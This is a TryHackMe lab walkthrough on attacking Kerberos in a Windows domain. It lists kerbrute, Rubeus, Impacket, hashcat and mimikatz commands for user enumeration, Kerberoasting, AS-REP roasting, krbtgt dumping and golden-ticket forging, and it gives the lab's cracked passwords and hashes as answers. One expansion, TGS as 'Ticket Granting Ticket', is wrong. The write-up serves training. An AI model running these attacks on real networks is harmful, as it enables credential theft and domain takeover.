---
title: "[TryHackMe][CompTIA_Pentest+][Attacking_Kerberos]"
layout: post
date: 2022-05-25 08:00
image: /assets/images/tryhackme.png
headerImage: false
tag:
- TryHackMe
- CompTIA_Pentest+
- Local-host vulnerabilities
category: blog
author: Safak AYDIN
description: Attacking_Kerberos
---

## Summary:

Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller.

#### Tasks
- [Introduction](#introduction)
- [Enumeration w/ Kerbrute](#enumeration-w/-kerbrute)
- [Harvesting & Brute-Forcing Tickets w/ Rubeus](#harvesting-&-brute-forcing-tickets-w/-rubeus)
- [Kerberoasting w/ Rubeus & Impacket](#kerberoasting-w/-rubeus-&-impacket)
- [AS-REP Roasting w/ Rubeus](#as-rep-roasting-w/-rubeus)
- [Golden/Silver Ticket Attacks w/ mimikatz](#golden/silver-ticket-attacks-w/-mimikatz)

---

## Introduction

**Question :** What does TGT stand for ?

{% highlight html %}
Answer : Ticket Granting Ticket
{% endhighlight %}

> TGT represents a ticket that the KDC gives us to access a service

**Question :** What does SPN stand for ?

{% highlight html %}
Answer : Service Principal Name
{% endhighlight %}

> SPN is the combination of a service, the machine hosting the service and the service class

**Question :** What does PAC stand for ?

{% highlight html %}
Answer : Privilege Attribute Certificate
{% endhighlight %}

> The PAC is a kind of extension of the Kerberos protocol used by Microsoft for the proper management of rights in an Active Directory

**Question :** What two services make up the KDC ?

{% highlight html %}
Answer : AS, TGS
{% endhighlight %}

> "*AS*" for **Authentication Service**, corresponds to the authentication phase of the user at the KDC

> "*TGS*" for **Ticket Granting Ticket**, corresponds to the request for a ticket to access a selected service

## Enumeration w/ Kerbrute

> First, we list the open ports and therefore the services that are running. We use **nmap** for this: 

![image](https://user-images.githubusercontent.com/80531900/170521501-ea85c969-77f7-4d95-afbc-55b96bdb47c0.png){: class="bigger-image" }

> We see that port 3389 (RDP) is running on the machine, we get the domain name

* Pre-requisite :
{% highlight html %}
# echo "THM_Machine_IP   CONTROLLER.LOCAL" >> /etc/hosts
{% endhighlight %}

![image](https://user-images.githubusercontent.com/80531900/170521628-42d1a23c-a527-4659-936b-1cb0d684bc7c.png)

* Kerbrute installation : 
{% highlight html %}
# wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
# chmod +x kerbrute_linux_amd64
# mv kerbrute_linux_amd64 /usr/bin/kerbrute
# kerbrute -h
{% endhighlight %}

* Username Wordlist Import : 
{% highlight html %}
# wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt
{% endhighlight %}

* Enumerating Users : 
{% highlight html %}
# kerbrute userenum --dc CONTROLLER.LOCAL -d CONTROLLER.LOCAL User.txt
{% endhighlight %}

![image](https://user-images.githubusercontent.com/80531900/170522935-cd3f7925-6a2f-4be4-ab54-f0a58723001f.png)

**Question :** How many total users do we enumerate ?

{% highlight html %}
Answer : 10
{% endhighlight %}

**Question :** What is the SQL service account name ?

{% highlight html %}
Answer : SQLService
{% endhighlight %}

**Question :** What is the second "machine" account name ?

{% highlight html %}
Answer : Machine2
{% endhighlight %}

**Question :** What is the third "user" account name ?

{% highlight html %}
Answer : User3
{% endhighlight %}

## Harvesting & Brute-Forcing Tickets w/ Rubeus

* Connection to the remote machine via SSH :
{% highlight html %}
# ssh Administrator@"THM_Machine_IP"
# Password : P@$$W0rd
{% endhighlight %}

* Pre-requisite :
{% highlight html %}
# echo "THM_Machine_IP   CONTROLLER.LOCAL" >> C:\Windows\System32\drivers\etc\hosts
# cd Downloads
{% endhighlight %}

* Execute Rubeus.exe : 
{% highlight html %}
# Rubeus.exe brute /password:Password1 /noticket
{% endhighlight %}

**Question :** Which domain admin do we get a ticket for when harvesting tickets ?

{% highlight html %}
Answer : Administrator
{% endhighlight %}

**Question :** Which domain controller do we get a ticket for when harvesting tickets ?

{% highlight html %}
Answer : CONTROLLER-1
{% endhighlight %}

## Kerberoasting w/ Rubeus & Impacket

* With Rubeus.exe :
{% highlight html %}
# cd Downloads
# Rubeus.exe kerberoast
# We retrieve the kerberos **hash** of a user
# wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
# echo **Retrieve_Hash** > hash.txt 
# hashcat -m 13100 -a 0 hash.txt Pass.txt
{% endhighlight %}

* With Impacket :
{% highlight html %}
# wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
# cd /opt
# wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_19/impacket-0.9.19.tar.gz
# tar -xzvf impacket-0.9.19.tar.gz
# cd impacket-0.9.19/
# pip install .
# cd /usr/share/doc/python3-impacket/examples/
# sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip "THM_Machine_Ip" -request
# echo "Hash" > hash.txt 
# hashcat -m 13100 -a 0 hash.txt Pass.txt
{% endhighlight %}

**Question :** What is the HTTPService Password ?

{% highlight html %}
Answer : Summer2020
{% endhighlight %}

**Question :** What is the SQLService Password ?

{% highlight html %}
Answer : MYPassword123#
{% endhighlight %}

## AS-REP Roasting w/ Rubeus

* Dumping KRBASREP5 Hashes :
{% highlight html %}
# Rubeus.exe asreproast
{% endhighlight %}

* Cracking KRBASREP5 Hashes :
{% highlight html %}
# echo "Hash" > hash.txt
# hashcat -m 18200 hash.txt Pass.txt
{% endhighlight %}

> Note : We need to add the value "$23" after "$krb5asrep" in the hash file to crack the **hash** !

**Question :**  What hash type does AS-REP Roasting use ? 

{% highlight html %}
Answer : Kerberos 5 AS-REP etype 23
{% endhighlight %}

**Question :** Which User is vulnerable to AS-REP Roasting ?

{% highlight html %}
Answer : User3
{% endhighlight %}

**Question :** What is the User's Password ?

{% highlight html %}
Answer : Password3
{% endhighlight %}

**Question :** Which Admin is vulnerable to AS-REP Roasting ?

{% highlight html %}
Answer : Admin2
{% endhighlight %}

**Question :** What is the Admin's Password ?

{% highlight html %}
Answer : P@$$W0rd2
{% endhighlight %}

## Golden/Silver Ticket Attacks w/ mimikatz

* Dumping "*krbtgt*" hash :
{% highlight html %}
# cd Downloads && mimikatz.exe
# privilege::debug
# lsadump::lsa /inject /name:krbtgt
{% endhighlight %}

* Creation of a Gold/Silver ticket :
{% highlight html %}
# Kerberos::golden /user:Administrator /domain:controller.local /sid:"SID_KRBTGT" /krbtgt:"NTLM" /id:"Admin"
{% endhighlight %}

* Use the Gold/Silver ticket to access another machine :
{% highlight html %}
# misc::cmd
# dir \\DESKTOP-1\c$
{% endhighlight %}

**Question :** What is the SQLService NTLM Hash ?

{% highlight html %}
Answer : cd40c9ed96265531b21fc5b1dafcfb0a
{% endhighlight %}

**Question :** What is the Administrator NTLM Hash ? 

{% highlight html %}
Answer : 2777b7fec870e04dda00cd7260f7bee6
{% endhighlight %}

